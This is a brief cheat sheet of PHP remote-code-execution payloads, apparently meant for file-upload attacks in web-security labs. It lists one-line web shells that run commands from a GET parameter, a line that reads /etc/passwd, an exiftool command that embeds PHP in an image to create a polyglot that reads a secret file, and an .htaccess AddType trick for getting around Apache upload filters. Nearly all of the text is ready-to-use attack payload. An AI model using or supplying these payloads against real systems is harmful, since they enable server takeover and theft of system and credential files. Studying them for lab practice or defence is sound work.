# PHP Payloads for RCE

## Normal Payloads
```php
<?php echo file_get_contents('/etc/passwd'); ?> >> To read files
<?php system($_GET['cmd']); ?> >> For system command
<?php passthru($_GET['cyborg71']); ?> >> For system command*
exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" hacker.jpg -o polyglot.php
```

## Apache Bypass
```
Before:
filename=".htaccess"
Content-Type: text/plain
AddType application/x-httpd-php .shell
After:
Content-Type: application/x-httpd-php
```

